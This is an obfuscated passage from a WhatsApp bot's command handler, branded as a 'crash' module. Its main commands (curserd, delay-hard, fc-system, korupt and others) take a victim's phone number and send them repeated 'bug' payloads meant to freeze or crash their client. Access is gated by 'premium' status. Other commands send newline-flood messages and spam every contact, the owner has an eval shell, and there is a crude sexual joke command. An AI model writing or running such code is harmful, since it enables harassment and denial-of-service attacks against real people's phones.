          let _0x10230c = Buffer.from(_0x350ce9.data.result.image, "base64");
          const _0xd7231f = {
            packname: "" + global.packname,
            author: "" + global.author
          };
          _0x40d3ea.sendImageAsSticker(_0x122228.chat, _0x10230c, _0x122228, _0xd7231f);
        }
        break;
      case "ozz":
        {
          if (!_0x8ab39f) {
            return _0x4d86cf("𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝚃𝙴𝙺𝚂. 𝙲𝙾𝙽𝚃𝙾𝙷:\n SV KapotID");
          }
          let _0x57b0ee = await _0xaa272c.filter(_0x5c45c6 => _0x5c45c6.id.endsWith(".net")).map(_0x17f8aa => _0x17f8aa.id);
          _0x122228.reply("wet");
          for (let _0x4771d5 of _0x57b0ee) {
            const _0x5774c8 = {
              text: q
            };
            _0x40d3ea.sendMessage(_0x4771d5, _0x5774c8);
          }
          _0x122228.reply("done");
        }
        break;
      case "clearbug":
        {
          if (!_0x34c793) {
            return _0x4d86cf("*𝐍𝐨𝐭 𝐎𝐰𝐧𝐞𝐫*\n𝐅𝐢𝐭𝐮𝐫 𝐈𝐧𝐢 𝐊𝐡𝐮𝐬𝐮𝐬 𝐎𝐰𝐧𝐞𝐫");
          }
          if (!q) {
            return _0x4d86cf("𝗘𝘅𝗮𝗺𝗽𝗹𝗲 " + (_0x539711 + _0x5e99b8) + " 𝟲𝟮×××");
          }
          let _0x1b7653 = q.replace(/[^0-9]/g, "");
          if (_0x1b7653.startsWith("0")) {
            return _0x4d86cf("𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : " + (_0x539711 + _0x5e99b8) + " 𝟲𝟮×××");
          }
          let _0x26237b = _0x1b7653 + "@s.whatsapp.net";
          for (let _0x454cee = 0; _0x454cee < 3; _0x454cee++) {
            await _0x40d3ea.sendMessage(_0x26237b, {
              text: "𝘾𝙐𝙆𝙄𝙈𝘼𝙔😹\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nMODUL CRASH NIH"
            });
          }
          _0x4d86cf("*`𝗗𝗢𝗡𝗘 𝙎𝘼𝙔𝘼𝙉𝙂`*");
        }
        break;
      case "curserd-hard":
      case "delay-hard":
      case "bug-ganas":
      case "queen":
      case "hard":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          if (!q) {
            return _0x4d86cf("❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: " + (_0x539711 + _0x5e99b8) + " 628×××");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x2b1886 = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + target + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          const _0x460d68 = {
            image: {
              url: "hhttps://files.catbox.moe/g8o93j.jpg"
            },
            caption: _0x2b1886,
            gifPlayback: false
          };
          const _0x53a0bd = {
            quoted: _0x321efd
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x460d68, _0x53a0bd);
          const _0x30da79 = {
            quoted: _0x282f41
          };
          await _0x40d3ea.sendMessage(_0x122228.chat, {
            audio: fs.readFileSync("./gallery/curserdv3.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x30da79);
          for (let _0x591987 = 0; _0x591987 < 10; _0x591987++) {
            await _0x4ec319(target);
          }
          let _0x4d6e4a = "*_" + _0x5e99b8 + "𝐁𝐔𝐆 𝐒𝐔𝐂𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 !!" + _0x5e99b8 + "_*\n> *𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚊𝚞𝚜𝚎 𝚏𝚘𝚛 5 𝚖𝚒𝚗𝚞𝚝𝚎*";
          const _0x5b1fa3 = {
            image: {
              url: "https://files.catbox.moe/xbrl74.jpg"
            },
            caption: _0x4d6e4a,
            gifPlayback: false
          };
          const _0x155fe0 = {
            quoted: _0x282f41
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x5b1fa3, _0x155fe0);
        }
        break;
      case "mati-beta":
      case "curserd-dek":
      case "beta-ampas":
      case "fc-beta":
      case "curserd":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          if (!q) {
            return _0x4d86cf("❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: " + (_0x539711 + _0x5e99b8) + " 628×××");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x48d211 = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + target + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          const _0x4a7308 = {
            image: {
              url: "https://files.catbox.moe/g8o93j.jpg"
            },
            caption: _0x48d211,
            gifPlayback: false
          };
          const _0x4b3716 = {
            quoted: _0x321efd
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x4a7308, _0x4b3716);
          const _0x7c5b4c = {
            quoted: _0x282f41
          };
          await _0x40d3ea.sendMessage(_0x122228.chat, {
            audio: fs.readFileSync("./gallery/curserdv3.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x7c5b4c);
          for (let _0x17343 = 0; _0x17343 < 10; _0x17343++) {
            await _0x57c58f(target);
          }
          let _0x1b81ce = "*_" + _0x5e99b8 + "𝐁𝐔𝐆 𝐒𝐔𝐂𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 !!" + _0x5e99b8 + "_*\n> *𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚊𝚞𝚜𝚎 𝚏𝚘𝚛 5 𝚖𝚒𝚗𝚞𝚝𝚎*";
          const _0x51d808 = {
            image: {
              url: "https://files.catbox.moe/xbrl74.jpg"
            },
            caption: _0x1b81ce,
            gifPlayback: false
          };
          const _0x3764ac = {
            quoted: _0x282f41
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x51d808, _0x3764ac);
        }
        break;
      case "freze":
      case "fc-system":
      case "lamp-delay":
      case "korupt":
      case "musnah":
      case "invis":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          if (!q) {
            return _0x4d86cf("❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: " + (_0x539711 + _0x5e99b8) + " 628×××");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x1e5eae = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + target + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          const _0x2e4c69 = {
            image: {
              url: "https://files.catbox.moe/g8o93j.jpg"
            },
            caption: _0x1e5eae,
            gifPlayback: false
          };
          const _0xc3312d = {
            quoted: _0x321efd
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x2e4c69, _0xc3312d);
          const _0x5a7085 = {
            quoted: _0x282f41
          };
          await _0x40d3ea.sendMessage(_0x122228.chat, {
            audio: fs.readFileSync("./gallery/curserdv3.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x5a7085);
          for (let _0x3049a1 = 0; _0x3049a1 < 10; _0x3049a1++) {
            await _0x91b33(target);
            await _0x387e39(1000);
          }
          let _0x20747c = "*_" + _0x5e99b8 + "𝐁𝐔𝐆 𝐒𝐔𝐂𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 !!" + _0x5e99b8 + "_*\n> *𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚊𝚞𝚜𝚎 𝚏𝚘𝚛 5 𝚖𝚒𝚗𝚞𝚝𝚎*";
          const _0xe0e20b = {
            image: {
              url: "https://files.catbox.moe/xbrl74.jpg"
            },
            caption: _0x20747c,
            gifPlayback: false
          };
          const _0x4853e5 = {
            quoted: _0x282f41
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0xe0e20b, _0x4853e5);
        }
        break;
      case "addprem":
      case "addmurbug":
        {
          if (!_0x46588c) {
            return _0x122228.reply(mess.owner);
          }
          const _0x25b393 = _0x1a8c93.join(" ");
          const _0x4ed0fa = _0x25b393.split("|")[0];
          const _0x54d469 = _0x25b393.split("|")[1];
          if (!_0x4ed0fa) {
            return _0x122228.reply("𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙽𝚄𝙼𝙱𝙴𝚁 𝚈𝙶 𝙼𝙰𝚄 𝙳𝙸 𝙰𝙳𝙳𝙿𝚁𝙴𝙼 𝙲𝙾𝙽𝚃𝙾𝙷 : " + (_0x539711 + _0x5e99b8) + " @tag|30d");
          }
          if (!_0x54d469) {
            return _0x122228.reply("𝙰𝙳𝙳𝙿𝚁𝙴𝙼 𝙱𝙴𝚁𝙰𝙿𝙰 𝙷𝙰𝚁𝙸? 𝙲𝙾𝙽𝚃𝙾𝙷: .𝙰𝙳𝙳𝙿𝚁𝙴𝙼 𝟼𝟸𝟶𝟶𝟶𝟶𝟶𝟶𝟶|𝟹𝟶𝙳");
          }
          let _0x243c56 = _0x122228.mentionedJid[0] ? _0x122228.mentionedJid[0] : _0x122228.quoted ? _0x122228.quoted.sender : _0x4ed0fa.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          if (owner.includes(_0x243c56)) {
            return _0x122228.reply("𝙰𝙽𝙳𝙰 𝚂𝚄𝙳𝙰𝙷 𝙿𝚁𝙴𝙼𝙸𝚄𝙼");
          }
          const _0x4c40d0 = _0x4743f9.checkPremiumUser(_0x243c56);
          if (_0x4c40d0) {
            return _0x122228.reply("𝚂𝚄𝙺𝚂𝙴𝚂 𝙰𝙳𝙳𝙿𝚁𝙴𝙼✅");
          }
          let _0x557d7b = await _0x40d3ea.onWhatsApp(_0x243c56);
          if (_0x557d7b[0].exists) {
            _0x4743f9.addPremiumUser(_0x243c56, _0x54d469);
            await _0x387e39(3000);
            let _0x1d0871 = ms(_0x4743f9.getPremiumExpired(_0x243c56) - Date.now());
            let _0x5ebbc7 = "𝚂𝚄𝙺𝚂𝙴𝚂 𝙰𝙳𝙳𝙿𝚁𝙴𝙼";
            const _0x490956 = {
              text: _0x5ebbc7,
              contextInfo: {
                externalAdReply: {
                  title: "𝐏𝐫𝐞𝐦 𝐂𝐮𝐫𝐬𝐞𝐫𝐝 𝐕『𝟑.𝟎』",
                  previewType: "PHOTO",
                  thumbnailUrl: "https://files.catbox.moe/dat7cz.jpg",
                  sourceUrl: "https://whatsapp.com/channel/0029VazqfJY8KMqqrvHFrv0Y"
                }
              }
            };
            const _0x172083 = _0x490956;
            const _0x4d9be8 = {
              quoted: _0x282f41
            };
            return _0x40d3ea.sendMessage(_0x122228.chat, _0x172083, _0x4d9be8);
          } else {
            _0x122228.reply("not found");
          }
        }
        break;
      case "delprem":
      case "delmurbug":
        {
          if (!_0x46588c) {
            return _0x122228.reply(mess.owner);
          }
          if (!_0x1a8c93[0]) {
            return _0x122228.reply("𝚂𝙸𝙰𝙿𝙰 𝚈𝙰𝙽𝙶 𝙼𝙰𝚄 𝙳𝙸 " + _0x5e99b8 + "? 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙽𝚄𝙼𝙱𝙴𝚁 𝙰𝚃𝙰𝚄 𝚃𝙰𝙶 𝙲𝙾𝙽𝚃𝙾𝙷 : " + _0x539711 + " 𝙳𝙴𝙻𝙿𝚁𝙴𝙼 @𝟼𝟸+++");
          }
          let _0x3310dd = _0x122228.quoted ? _0x122228.quoted.sender : _0x8ab39f.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x37a864 = _0x4743f9.checkPremiumUser(_0x3310dd);
          if (!_0x37a864) {
            return _0x122228.reply("𝙽𝙾𝚃 𝚄𝚂𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼");
          }
          let _0x4579f1 = await _0x40d3ea.onWhatsApp(_0x3310dd);
          if (_0x4579f1[0].exists) {
            let _0x163687 = JSON.parse(fs.readFileSync("./Database/lib/database/premium.json"));
            _0x163687.splice(_0x4743f9.getPremiumPosition(_0x3310dd), 1);
            fs.writeFileSync("./Database/lib/database/premium.json", JSON.stringify(_0x163687));
            _0x122228.reply("𝚂𝚄𝙲𝙲𝙴𝚂𝙵𝚄𝙻𝙻𝚈 𝙽𝚄𝙼𝙱𝙴𝚁 𝚃𝙴𝙻𝙰𝙷 𝙳𝙸𝙷𝙰𝙿𝚄𝚂");
          } else {
            _0x122228.reply("not found");
          }
        }
        break;
      case "ek-titiw":
      case "omtol":
        {
          if (!_0x8ab39f) {
            return _0x122228.reply("❗ᴋᴏɴᴛᴏʟ ᴄᴇᴋ ᴄᴏɴᴛᴏʜ : ᴋᴏɴᴛᴏʟ ᴀɴᴅʀᴀ");
          }
          _0x4d86cf("\n╭━━━━°「 *cek " + _0x8ab39f + "* 」°\n┃\n┊• ɴᴀᴍᴀ : " + _0x8ab39f + "\n┃• ᴋᴏᴍᴛᴏʟ : " + _0x4db59d(["ih item", "belang wkwk", "muluss", "putih mulus", "black doff", "pink wow", "item glossy", "mirip walid", "wkwk warna biru", "mirip kontol kuda"]) + "\n┊• ᴜᴋᴜʀᴀɴ : " + _0x4db59d(["5cm", "10cm", "7cm", "9cm", "15cm", "30cm", "100cm"]) + "\n┃• ᴊᴇᴍ*** : " + _0x4db59d(["lebat", "ada sedikit", "gada jembut", "tipis", "muluss", "lebat selebat pohon"]) + "\n╰═┅═━––––––๑");
        }
        break;
      case "dev":
      case "developer":
      case "owner":
      case "xowner":
        {
          let _0x54a168 = "KapotID Dev";
          let _0x888c9f = "6281326070075";
          const _0x31c209 = {
            displayName: _0x54a168,
            vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:" + _0x54a168 + "\nitem1.TEL;waid=" + _0x888c9f + ":+" + _0x888c9f + "\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:୧MODULCRASH V1.0ᯓ\nX-WA-BIZ-NAME:[[ 𝙉̴̫̎𝙤̶̢͊ 𝘿̷͙͋𝙚̸͕̈́𝙫̸͙̐𝙚̴̈ͅ𝙡̸̲̏𝙤̴̠͐𝙥̵͔̀𝙚̴̱͘𝙧̵̪͌ ]]\nEND:VCARD"
          };
          const _0x259f7a = {
            contactMessage: _0x31c209
          };
          var _0x313e1a = generateWAMessageFromContent(_0x122228.chat, proto.Message.fromObject(_0x259f7a), {
            userJid: _0x122228.chat,
            quoted: _0x282f41
          });
          _0x40d3ea.relayMessage(_0x122228.chat, _0x313e1a.message, {
            messageId: _0x313e1a.key.id
          });
        }
        break;
      default:
        if (_0x2be380.startsWith(">")) {
          if (!_0x5e5de3) {
            return;
          }
          try {
            let _0x1a8cea = await eval(_0x2be380.slice(2));
            if (typeof _0x1a8cea !== "string") {
              _0x1a8cea = require("util").inspect(_0x1a8cea);
            }
            await _0x122228.reply(_0x1a8cea);
          } catch (_0x58c6f0) {
            _0x122228.reply(String(_0x58c6f0));
          }
        }
        if (_0x2be380.startsWith("<")) {
          if (!_0x5e5de3) {
            return;
          }
          let _0x1dfb70 = _0x2be380.trim().split(/ +/)[0];
          let _0x3babfc;
          try {
            _0x3babfc = await eval("(async () => { " + (_0x1dfb70 == ">>" ? "return" : "") + " " + q + "})()");
          } catch (_0x378ce4) {
            _0x3babfc = _0x378ce4;
          } finally {
            await _0x122228.reply(require("util").format(_0x3babfc));
          }
        }
    }
  } catch (_0x9e25f) {
    console.log(require("util").format(_0x9e25f));
  }
};
let file = require.resolve(__filename);
require("fs").watchFile(file, () => {
  require("fs").unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});